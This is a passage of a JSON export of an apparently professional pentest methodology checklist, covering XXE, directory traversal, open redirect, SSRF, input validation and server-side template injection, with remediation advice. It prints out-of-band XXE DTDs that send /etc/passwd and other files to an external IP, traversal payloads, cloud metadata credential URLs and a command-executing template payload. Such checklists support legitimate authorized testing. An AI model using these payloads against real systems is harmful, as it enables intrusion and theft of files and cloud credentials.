\"http://209.118.108.216/stest.dtd\"&gt;</p><p>&lt;root&gt;</p><p>&lt;search&gt;name&lt;/search&gt;</p><p>&lt;/root&gt;</p><p><strong><em>Expected result example:</em></strong></p><p>HTTP/1.1 500 Internal Server Error</p><p>Content-Type: application/xml</p><p>Content-Length: 2467</p><p>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;root&gt;</p><p>&lt;errors&gt;</p><p>&lt;errorMessage&gt;java.io.FileNotFoundException: file:///nothere/root:x:0:0:root:x:0:0:root:/root:/bin/bash</p><p>daemon:x:1:1:daemon:/usr/sbin:/bin/sh</p><p>bin:x:2:2:bin:/bin:/bin/sh</p><p>sys:x:3:3:sys:/dev:/bin/sh</p><p>sync:x:4:65534:sync:/bin:/bin/sync...</p><p><strong><em>Below are different files that are currently on the netspi web server.</em></strong></p><p>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi.dtd\"&gt;</p><p>content:</p><p>&lt;!ENTITY % payload SYSTEM \"file:///var/log/messages\"&gt;</p><p>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;\"&gt;%param1;%external;</p><p>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi2.dtd\"&gt;</p><p>content:</p><p>&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;</p><p>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://%payload;:aaa@209.118.108.216:443'&gt;\"&gt;%param1;%external;</p><p>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi3.dtd\"&gt;</p><p>content:</p><p>&lt;!ENTITY % b SYSTEM \"file:///etc/passwd\"&gt;</p><p>&lt;!ENTITY % c \"&lt;!ENTITY &amp;&#35;37; rrr SYSTEM 'ftp://209.118.108.216:443/%b;'&gt;\"&gt;</p><p>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi4.dtd\"&gt;</p><p>content:</p><p>&lt;!DOCTYPE drawing SYSTEM \"http://209.118.108.216/netspi.dtd\"&gt;</p><p>&lt;!ENTITY payload \"file://c:\\windows\\win.ini\"&gt; </p><p>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi5.dtd\"&gt;</p><p>content:</p><p>&lt;!ENTITY % payload SYSTEM \"file:///etc/fstab\"&gt;</p><p>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;\"&gt;%param1;%external;</p><p>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi6.dtd\"&gt;</p><p>content:</p><p>&lt;!ENTITY % payload SYSTEM \"file:///Program Files/Business Objects/manifest.db\"&gt;</p><p>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://209.118.108.216:443/%payload;'&gt;\"&gt;%param1;%external;</p><p>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi7.dtd\"&gt;</p><p>content:</p><p>&lt;!ENTITY % payload SYSTEM \"file:///Documents and Settings/\"&gt;</p><p>&lt;!ENTITY % end \"]]&gt;\"&gt;</p><p>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'file:///test/%payload;'&gt;\"&gt;%param1;%external;</p><p>CDATA:</p><p>Injection (With inflection point):</p><p>&lt;!DOCTYPE updateProfile [</p><p> &lt;!ENTITY % file SYSTEM \"file:///test\"&gt;</p><p> &lt;!ENTITY % start \"&lt;![CDATA[\"&gt;</p><p> &lt;!ENTITY % end \"]]&gt;\"&gt;</p><p> &lt;!ENTITY % dtd SYSTEM \"http://209.118.108.216/cdata.dtd\"&gt;</p><p>%dtd;</p><p>]&gt;</p><p>On NetSPI server:</p><p>&lt;!ENTITY all \"%start;%file;%end;\"&gt;</p><p><strong><em>Monitoring incoming traffic</em></strong></p><p>1. Login into 10.2.4.11 via ssh as root or login via the vsphere client.</p><p>2. Montor incoming request via the Apache log with the command below.</p><p>tail -f /var/log/apache2/httpd-access.log</p>",
							"references": "<ul><li>https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)</li><li>https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</li><li>https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Consider all XML input as untrusted, and thus prohibit all external entity references and inline DOCTYPE definitions. Additionally, disable support for XInclude.</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "01e13cb8-2285-413c-bf12-2300ec359cad",
						"name": "Directory Traversal",
						"instructions": "<p>If (more) sensitive information can be found or acted upon, then this should be upgraded to <strong>critical</strong> along with a matching CVSS. For example, if a username and password is found in <code>/etc/fstab</code> and that can be used to successfully connect, then that's higher severity.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21930,
							"uid": "da269b32-52ed-dd11-8199-001e4f12001c",
							"name": "Directory Traversal",
							"description": "<p>The application uses unsanitized user input to access files on the affected system. By injecting path traversal sequences into the user input it is possible to gain unauthorized access to arbitrary files on the system.</p>",
							"severityId": 3,
							"businessImpact": "<p>Successful exploitation of the directory traversal vulnerability allows an attacker to access files located on the targeted server. This may result in disclosure of sensitive information, such as user credentials, and thus result in further compromise of the affected system.</p><p>Directory traversal vulnerabilities affecting file creation functionality may allow a malicious user to create and possibly overwrite files which could compromise the confidentiality, integrity, and availability of the affected system.</p>",
							"sourceIdentifier": "M:21930",
							"verificationInstructions": "<h3>Note:</h3><p>This is High by default including the CVSS, however, if <strong>sensitive information</strong> can be found or acted upon, this should be upgraded to Critical along with the CVSS.</p><p><strong>Verification Instructions</strong></p><p>Identify parameters that appear to be used to denote files or folders on the server. Inject path traversal sequences in an attempt to determine if path traversal is possible and to escape the intended file location.</p><p>No error on vulnerable system (same as file=test.doc):</p><p>file=./test.doc</p><p>file=.\\test.doc</p><p>Error on vulnerable system (file does not exist):</p><p>file=../test.doc</p><p>file=..\\test.doc</p><p>Test if the application display directory listings if parameter is modified to be a folder:</p><p>file=./</p><p>file=.\\</p><p>Attempt to access known files:</p><p>file=..\\..\\..\\..\\web.config</p><p>file=../../../../etc/passwd</p><p>file=../../../../etc/fstab</p><p>Additionally, on Windows systems, try UNC paths to connect to remote resources. If UNC paths are accepted, try connecting to externally available pentester controled servers.</p><p>If plain traversal sequences do not work use Burp Intruder to determine if encoded etc. path traversal sequences can be used:</p><ol><li><p>Send request to Intruder and mark injection point</p></li><li><p>Select Fuzzing - Path Traversal template</p></li><li><p>Create Payload Processing rule Match/Replace</p></li><li><p>Replace {FILE} with known file (Linux/Unix or Windows)</p></li><li><p>Example: Match regex: \\{FILE\\}</p></li><li><p>Example: Replace with: etc/passwd</p></li></ol><p>You can also use  PWNWIKI for a list of common file paths:</p><ul><li><p>Windows - http://pwnwiki.io/&#35;!presence/windows/blind.md</p></li><li><p>Linux - http://pwnwiki.io/&#35;!presence/linux/blind.md</p></li></ul><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot the initial page</p></li><li><p>Show the normal HTTP request</p></li><li><p>Show directory traversal sequence in request parameter</p></li><li><p>Show access to files that are not normally accessible via the web site</p></li></ol><p><strong>Further Testing</strong></p><p>If directory traversal vulnerabilities found, attempt to gain access to files that contain sensitive information. Potential findings:</p><ul><li><p>Cleartext password in files</p></li><li><p>Insufficient egress filtering</p></li></ul>",
							"references": "<ul><li>https://owasp.org/www-community/attacks/Path_Traversal</li></ul>",
							"exploitInstructions": "<p>Attempt to read source code, configuration, and log files to identify password or vulnerabilities that will provide command execution on the affected system.</p>",
							"remediationInstructions": "<p>Ensure that all data used by the application is put through a data input filter that removes potentially harmful characters. Best practice recommends the use of allow lists using regular expressions.</p><p>A non-privileged service account should be used to run the web server. Following the principle of least privilege when assigning permissions for the service account helps limit the impact of a successful directory traversal attack.</p>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "77532689-c134-40ae-9ef1-73854c406819",
						"name": "Parameter Based Redirection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21273,
							"uid": "f8fb984e-03b1-dd11-992f-001e4f120030",
							"name": "Parameter Based Redirection",
							"description": "<p>It is possible to cause a user to be redirected to another URL of the attacker's choosing by manipulating a parameter.</p><p>For example, if the following example URL was sent to a user:</p><pre><code>http://www.example.com/redirect.cgi?RedirectURL=www.PhishingWebsite.com</code></pre><p>An attacker could obfuscate the RedirectURL parameter to make it less obvious to the user that they would be redirected to a phishing site. A URL like this could be sent to users in a phishing e-mail; since the URL contains the domain of a valid web site (www.example.com), users may be less likely to recognize it as part of a phishing attack. Were a user to click on the URL, they could be redirected to a phishing site that looks exactly like www.example.com, but is the attacker's web site. This could also be used to redirect users to web sites with malicious software embedded in the page, to exploit outdated or unpatched browsers.</p>",
							"severityId": 2,
							"businessImpact": "<p>Were a user to click on a maliciously crafted link sent by an attacker, the user would be redirected to a web site of the attacker's choosing. This could aid in phishing attacks or automated exploits of outdated or unpatched browsers. Were a user to fall victim to a phishing attack, their credentials could be stolen. If a user with an outdated or unpatched browser clicked on the URL, the attacker could potentially gain complete control over the system.</p>",
							"sourceIdentifier": "WI:10705",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Submit a URL in the parameter value to the vulnerable website. If successful, the client will be redirected to a page of the attacker's choice.</p><p>Example:</p><p>A script usually has three components:</p><ul><li><p>The name of the script (redirect.cgi).</p></li><li><p>The parameter of the script (redirect.cgi?url=).</p></li><li><p>The value of the parameter (redirect.cgi?url=http://www.netspi.com/).</p></li></ul><p>By passing a value of http://www.netspi.com to the parameter an attacker can redirect an unsuspecting user to a site of their choice.</p><p>If parameter based redirection issues are identified in POST requests, try converting POST to GET to see if the application accepts request parameters as GET parameters. Parameter based redirection in POST request is not really exploitable.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot the vulnerable page</p></li><li><p>Inject arbitrary URL (typically www.netspi.com) into the parameter</p></li><li><p>Show that client browser is redirected to the injected URL</p></li></ol>",
							"references": "<ul><li>https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>The following recommendations will help reduce the risk of parameter-based redirection attacks:</p><ul><li><p>Do not rely on the HTML meta refresh tag or HTTP redirection capabilities as a method of redirecting users to other sites specified by the user</p></li><li><p>Always sanitize data returned from a user or other application components before storing or processing it or presenting it back to the application user.</p></li><li><p>Maintain a list of valid \"redirection\" URLs.</p></li><li><p>Ensure that all characters that could be interpreted as an executable language are replaced with their corresponding HTML encoded versions.</p></li><li><p>Do not reference redirection URLs or alternative file paths within the browser's URL path.</p></li><li><p>Do not use the Referrer header (or an equivalent) as a method of authorization or authentication.</p></li><li><p>Inform users that they are leaving the web site with an intermediate warning page whenever the user navigates away from the affected web site.</p></li></ul><p>For CA's SiteMinder:</p><p>To configure agents to help protect your resources from phishing attempts that could redirect users to a hostile website, set the following configuration parameter:</p><pre><code>ValidTargetDomain</code></pre><p>This parameter specifies the domains to which a credential collector is allowed to redirect users. If the domain in the URL does not match the domains set in this parameter, the redirect is denied. By default, this is disabled.</p><p>The <code>ValidTargetDomain </code>parameter identifies the valid domains for the target during processing. Before the user is redirected, the agent compares the values in the redirect URL against the domains in this parameter. Without this parameter, the agent redirects the user to targets in any domain. The <code>ValidTargetDomain </code>parameter can include multiple values, one for each valid domain.</p><p>For local agent configurations, specify an entry, one entry per line, for each domain, for example:</p><pre><code>validtargetdomain=\".xyzcompany.com\"\nvalidtargetdomain=\".abccompany.com\"</code></pre>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "fd15b3ff-d4c4-4ae6-a796-242d24ef7356",
						"name": "Server-Side Request Forgery",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17055128,
							"uid": "ed068937-a6df-e411-a2a9-001e4f12001c",
							"name": "Server-Side Request Forgery",
							"description": "<p>As part of the application workflow, the application established a connection to an external resource. It is possible to modify the endpoint for this resource and force the application server to attempt to access a different location.</p>",
							"severityId": 3,
							"businessImpact": "<p>An attacker could potentially capture application server or endpoint credentials, or other sensitive information contained in the modified application request.</p>",
							"sourceIdentifier": "M:ed068937-a6df-e411-a2a9-001e4f12001c",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Identify parameters or headers in the application that can be modified to force the backend servers to connect to a remote resource. Try capturing connections via HTTP, DNS or other protocols via Burp Collaborator. If outbound connectivity is allowed, attempt to connect to a NetSPI pentest servers to capture authentication handshakes (both SMB and HTTP).</p><p><strong>Determine the correct finding to use:</strong></p><p><strong>Non - Host header attack</strong></p><p>Example:</p><p>https://website/login?username=uid&amp;password=pwd&amp;server=xyz.net-spi.com</p><p>If you can get a reach out to a Burp Collaborator, but its not from the application IP, <strong>or</strong> it is from the application IP but is just DNS without any impact, use <strong>External Service Interaction</strong>.</p><p>If the DNS-only reach out can be weaponized, use <strong>Server-Side Request Forgery - DNS Only.</strong></p><p>If any HTTP reach out is possible <strong>and</strong> the IP is from the client's application or infrastructure (does not need to be weaponized) use <strong>Server-Side Request Forgery.</strong></p><p><strong>Host Header attack nuances:</strong></p><p>If the external domain is added to the <strong>Host Header</strong> and:</p><p>- An HTTP request is made to the domain from the client app or infrastructure, use <strong>Server-Side Request Forgery</strong></p><p>- the request comes from an intermediate proxy or WAF and only performs DNS reach outs, it is a false positive.</p><p>- the application redirects you to the external domain, it is a false positive.</p><p>- the application uses the external domain in a variety of interactions between different systems of the website's infrastructure, such as using it as the host for password reset links in emails, use <strong>Host Header Poisoning</strong></p><h3><strong>Reporting Requirements:</strong></h3><p>Add an explanation what causes the connection</p><p>Show the initial page</p><p>Show request with modified parameters</p><p>Show captured traffic</p><p><strong>Report the following vulnerabilities if applicable:</strong></p><p>Insufficient egress filtering</p><h3><strong>Tools:</strong></h3><p>Burp Collaborator</p><p>Responder</p><p>Inveigh</p>",
							"references": "<ul><li>https://cwe.mitre.org/data/definitions/918.html</li><li>https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "<p>If you are in the cloud, attempt to reach some of the metadata services: https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b (copied below)</p><p>## AWS</p><p># from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories</p><p>http://169.254.169.254/latest/user-data</p><p>http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]</p><p>http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]</p><p>http://169.254.169.254/latest/meta-data/ami-id</p><p>http://169.254.169.254/latest/meta-data/reservation-id</p><p>http://169.254.169.254/latest/meta-data/hostname</p><p>http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key</p><p>http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key</p><p># AWS - Dirs </p><p>http://169.254.169.254/</p><p>http://169.254.169.254/latest/meta-data/</p><p>http://169.254.169.254/latest/meta-data/public-keys/</p><p>## Google Cloud</p><p>#  https://cloud.google.com/compute/docs/metadata</p><p>#  - Requires the header \"Metadata-Flavor: Google\" or \"X-Google-Metadata-Request: True\"</p><p>http://169.254.169.254/computeMetadata/v1/</p><p>http://metadata.google.internal/computeMetadata/v1/</p><p>http://metadata/computeMetadata/v1/</p><p>http://metadata.google.internal/computeMetadata/v1/instance/hostname</p><p>http://metadata.google.internal/computeMetadata/v1/instance/id</p><p>http://metadata.google.internal/computeMetadata/v1/project/project-id</p><p># Google allows recursive pulls </p><p>http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true</p><p>## Google</p><p>#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)</p><p>http://metadata.google.internal/computeMetadata/v1beta1/</p><p>## Digital Ocean</p><p># https://developers.digitalocean.com/documentation/metadata/</p><p>http://169.254.169.254/metadata/v1.json</p><p>http://169.254.169.254/metadata/v1/ </p><p>http://169.254.169.254/metadata/v1/id</p><p>http://169.254.169.254/metadata/v1/user-data</p><p>http://169.254.169.254/metadata/v1/hostname</p><p>http://169.254.169.254/metadata/v1/region</p><p>http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address</p><p>## Packetcloud</p><p>https://metadata.packet.net/userdata</p><p>## Azure</p><p>#  Limited, maybe more exist?</p><p># https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/</p><p>http://169.254.169.254/metadata/v1/maintenance</p><p>## Update Apr 2017, Azure has more support; requires the header \"Metadata: true\"</p><p># https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service</p><p>http://169.254.169.254/metadata/instance?api-version=2017-04-02</p><p>http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text</p><p>## OpenStack/RackSpace </p><p># (header required? unknown)</p><p>http://169.254.169.254/openstack</p><p>## HP Helion </p><p># (header required? unknown)</p><p>http://169.254.169.254/2009-04-04/meta-data/ </p><p>## Oracle Cloud</p><p>http://192.0.0.192/latest/</p><p>http://192.0.0.192/latest/user-data/</p><p>http://192.0.0.192/latest/meta-data/</p><p>http://192.0.0.192/latest/attributes/</p><p>## Alibaba</p><p>http://100.100.100.200/latest/meta-data/</p><p>http://100.100.100.200/latest/meta-data/instance-id</p><p>http://100.100.100.200/latest/meta-data/image-id</p>",
							"remediationInstructions": "<p>Ensure sensitive endpoint information stays server-side and is not modifiable by the client.</p>"
						},
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "f934f7da-b873-4c7c-8d6d-054953bd897e",
						"name": "Server-Side Request Forgery - DNS Only",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17055315,
							"uid": "73c43cc0-0119-e511-80cc-ecf4bbd04073",
							"name": "Server-Side Request Forgery - DNS Only",
							"description": "<p>As part of the application workflow, the application established a connection to an external resource. It was possible to modify the endpoint for this resource and force the application server to attempt to access a different location. However, due to proper egress filtering external connections could not be established but the application performed name resolution for external sources and those DNS requests could be captured on external systems. In this situation, it will often be possible to use the relevant service to connect to other systems within the same organization, or to services available on the local loopback adapter of the application server itself.</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker could potentially capture application server or endpoint credentials, or other sensitive information contained in the modified application request.</p>",
							"sourceIdentifier": "M:73c43cc0-0119-e511-80cc-ecf4bbd04073",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Identify parameters in the application that can be modified to force the backend servers to connect to a remote resource. Try capturing HTTP, DNS or other protocol requests with Burp Collaborator. If outbound connectivity is allowed, attempt to connect to a NetSPI pentest servers to capture authentication handshakes (both SMB and HTTP).</p><p>Sample:</p><p>https://website/login?username=uid&amp;password=pwd&amp;server=xyz.net-spi.com</p><p><strong>Determine the correct finding to use:</strong></p><p><strong>Non - Host header attack</strong></p><p>Example:</p><p>https://website/login?username=uid&amp;password=pwd&amp;server=xyz.net-spi.com</p><p>If you can get a reach out to a Burp Collaborator, but its not from the application IP, <strong>or</strong> it is from the application IP but is just DNS without any impact, use <strong>External Service Interaction</strong>.</p><p>If the DNS-only reach out can be weaponized, use <strong>Server-Side Request Forgery - DNS Only.</strong></p><p>If any HTTP reach out is possible <strong>and</strong> the IP is from the client's application or infrastructure (does not need to be weaponized) use <strong>Server-Side Request Forgery.</strong></p><p><strong>Host Header nuances:</strong></p><p>If the external domain is added to the <strong>Host Header</strong> and:</p><p>- An HTTP request is made to the domain from the client app or infrastructure, use <strong>Server-Side Request Forgery</strong></p><p>- the request comes from an intermediate proxy or WAF and only performs DNS reach outs, it is a false positive.</p><p>- the application redirects you to the external domain, it is a false positive.</p><p>- the application uses the external domain in a variety of interactions between different systems of the website's infrastructure, such as using it as the host for password reset links in emails, use <strong>Host Header Poisoning</strong></p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add an explanation what causes the connection</p></li><li><p>Add an explanation that only DNS traffic is allowed outbound but the vulnerability could be exploited to access internal systems</p></li><li><p>Show the initial page</p></li><li><p>Show request with modified parameters</p></li><li><p>Show captured traffic</p></li></ol>",
							"references": "<ul><li>https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure sensitive endpoint information stays server-side and is not modifiable by the client. If clients must be able to control endpoint information, implement allow lists to ensure that connections can be made to approved endpoints only.</p>"
						},
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "c3f49001-0754-4389-a1b9-8e0e8e83957e",
						"name": "Insufficient Input Validation",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 488151,
							"uid": "78a3fc28-3c96-de11-aebb-001e4f120021",
							"name": "Insufficient Input Validation",
							"description": "<p>One or more areas in the application do not perform sufficient input validation, allowing users to submit unexpected input to the application.</p>",
							"severityId": 2,
							"businessImpact": "<p>Insufficient input validation may allow unexpected or invalid user input to be entered into the application. Depending on the user input, it may interfere with the application logic, cause invalid data entries, or potentially break application functionality.</p>",
							"sourceIdentifier": "M:488151",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Submit invalid values for parameter values. Use this finding if bad user input causes functional problems. For example, if adding invalid parameter values to user input breaks some application functionality. If actual attacks, such as XSS, can be exploited, then report those. </p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show the initial page</p></li><li><p>Show request with invalid input</p></li><li><p>Show broken functionality</p></li><li><p>Add an explanation whether the issue affects only the current user or other users as well</p></li></ol>",
							"references": "<ul><li><p>https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html</p></li><li><p>https://owasp.org/www-community/attacks/Web_Parameter_Tampering</p></li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>The following recommendations will help reduce the risk of special characters causing problems with the application behavior:</p><ul><li><p>Perform all input validation server-side.</p></li><li><p>Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. Allow-listing should be used as the base validation method of user input; deny-listing can be used as an additional layer of protection.</p></li><li><p>Whenever possible, limit all client-supplied data to alphanumeric data. If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document.</p></li><li><p>Many server-side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displaying it to the client.</p></li></ul>"
						},
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "dc2c0303-9db7-4e8f-9e9a-5e0a317690d3",
						"name": "Insufficient Input Validation - Client-Side Controls",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21823,
							"uid": "9086c7d6-eee7-dd11-8199-001e4f12001c",
							"name": "Insufficient Input Validation - Client-Side Controls",
							"description": "<p>The application uses client-side input validation to ensure that the client inputs proper data to form fields. A malicious user can bypass the client-side controls and submit unexpected data to the application.</p>",
							"severityId": 1,
							"businessImpact": "<p>Insufficient input validation allows unexpected user input to be submitted to the application. This may modify the application behavior or render some portions of the application unusable.</p>",
							"sourceIdentifier": "M:21823",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Look for client side input validation (usually JavaScript) or disabled functionality (grayed out buttons or form fields). If actual attacks, such as XSS, can be exploited, then report those. Use this finding if bad user input causes functional problems. For example, if adding invalid parameter values to user input breaks some application functionality.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Describe implemented client-side controls</p></li><li><p>Show the initial page</p></li><li><p>Show request with invalid input</p></li><li><p>Show broken functionality</p></li><li><p>Add an explanation whether the issue affects only the current user or other users as well</p></li></ol>",
							"references": "<ul><li>https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html</li><li>https://owasp.org/www-community/attacks/Web_Parameter_Tampering</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Use client-side input validation and control only as a redundant form of input validation. Implement server-side input validation and controls that ensure any data received from users will be subject to validation even if the user disables any client-side controls.</p>"
						},
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 4,
				"collapsed": true
			},
			{
				"uid": "bab3a52b-a519-42b6-bfac-46ea364c1b9a",
				"name": "Injections - Less Common",
				"description": "",
				"type": 1,
				"tasks": [
					{
						"uid": "900afbaf-c317-4819-9352-10381cff9841",
						"name": "Server-Side Template Injection",
						"instructions": "<p>Use the following list of polyglot SSTI payloads. Note that the first one is most likely to catch various engines, all the subsequent ones are progressively shorter to circumvent input limits but also more likely to miss catching a true positive.</p><pre><code>${{&lt;%[%'\"}}%{%}{#7*7}#{a.b}{$test}{$smarty.now}#set($x=1)${7*7}{{7*7}}&lt;#attempt&gt;{{ 7 | plus: 7 }}{{ 7|add(7) }}@{}@{7*7}@(7*7)*{}&lt;%= 7*7 %&gt;[%7*7%]\n${{&lt;%[%'\"}}%{%}{#}#{$}{$.}#set(}@{{&lt;#&lt;%= %q[ %] %&gt;\n${{&lt;#{{7*7}}{%{$test}${7*7}#{7*7}@{7*7}@(7*7){{7|add(7)}}@{}&lt;%= 7*7 %&gt;[% 7 * 7 %]\n{{&lt;%${{$}{$.#{@{\n{{&lt;%{$.@{\n${{&lt;%[%'\"}}%\\\n{{7*7}}{$x}@{7*7}</code></pre><p>  Alternatively, here are engines and possible matches:</p><pre><code>Templating Engine\tMatched By\nJinja2\t{{, {%, {{7*7}}\nDjango\t{{, {%\nTwig\t{{, {%, {{ 7 | plus: 7 }}, {{ 7 | add(7) }}\nSmarty\t{$test}, {$smarty.now}\nMako\t${, &lt;%\nVelocity\t$, #set($x=1)\nFreemarker\t${}, &lt;#attempt&gt;\nPug\t#{7*7}, #{a.b}\nHandlebars\t{{\nEJS\t&lt;%\nLiquid\t{{ 7 | plus: 7 }}, {{ 7|add(7) }}\nAngularJS\t{{\nThymeleaf\t@{}, *{}\nRazor (ASP.NET)\t@{}, @(7*7)\nERB (Embedded Ruby)\t&lt;%= 7*7 %&gt;\nTemplate Toolkit (Perl)\t[% 7*7 %]</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17056821,
							"uid": "1e44d4ad-7676-e511-80d4-ecf4bbd04073",
							"name": "Server-Side Template Injection",
							"description": "<p>Server-side template injection occurs when user input is unsafely embedded into a template which is then executed by the server. By submitting malicious payloads using the native templating language, an attacker may be able to execute arbitrary code on the web server.</p>",
							"severityId": 3,
							"businessImpact": "<p>Template injection vulnerabilities can be very serious and may expose the application to a wide attack surface. In some cases, the injection may be innocuous, but oftentimes it can be used to achieve remote code execution on the server. If this is not an option, an attacker may be able to leverage this vulnerability to read sensitive files from the server.</p>",
							"sourceIdentifier": "BUR:1052800",
							"verificationInstructions": "<p>The following process should be used when identifying and exploiting server-side template injection: Detect &gt; Identify &gt; Exploit.</p><p><strong>Detect:</strong></p><p>The first step is discovering the injection. Try fuzzing the template by submitting characters such as <code>${{&lt;%[%'&quot;}}%\\</code> and looking for error messages in the HTTP response. Attempt to insert payloads such as <code>${7&#42;7}</code> and <code>{{7&#42;7}}</code> and look to see if the payloads are treated as data (i.e. <code>{{7&#42;7}}</code>) or templating code (i.e <code>7777777</code>). Another way to induce application errors is with the payload <code>${7/0}</code> or something similar that would induce a divide-by-zero error. The responses will help you determine if the parameter is injectable.</p><p><strong>Identify:</strong></p><p>After you have confirmed the vulnerability, the next step is to identify the templating language involved. This information might be included in error messages achieved during the detection phase, but if not there are other ways to determine the templating language. While most templating languages are syntactically similar, they do not always process code in the same manner. For instance, the payload <code>{{7&#42;'7'}}</code> returns <code>49</code> in the Twig framework and <code>7777777</code> in the Jinja framework. It is important to read the documentation for each framework to understand how each templating language will interpret various code snippets.</p><p><strong>Exploit:</strong></p><p>At this stage you have verified the template injection is valid and you know the framework involved. Now the only part left is to use a suitable payload to show the impact of the vulnerability. This can be achieved by reading the documentation for potential security risks, looking for known exploits, and exploring your level of access by submitting various payloads. For instance, the following payload will return the user under which the server is running: <code>&lt;% import os x=os.popen('whoami').read() %&gt; ${x}</code>. It is important to read the documentation very carefully for the templating engine you are attempting to exploit. The application may implement sandbox security controls that may limit your access, so you may have to get creative with finding a way to bypass these mechanisms.</p><p><strong>Reporting Requirements:</strong></p><p>The following method should be used when it comes to reporting:</p><p>1. Screenshot the initial page.</p><p>2. Show the HTTP request in which you detect the server-side template injection vulnerability and highlight the error message or result.</p><p>3. If necessary, show the HTTP request in which you identify the templating engine and highlight the result. Be sure to explain how the payload relates to the templating 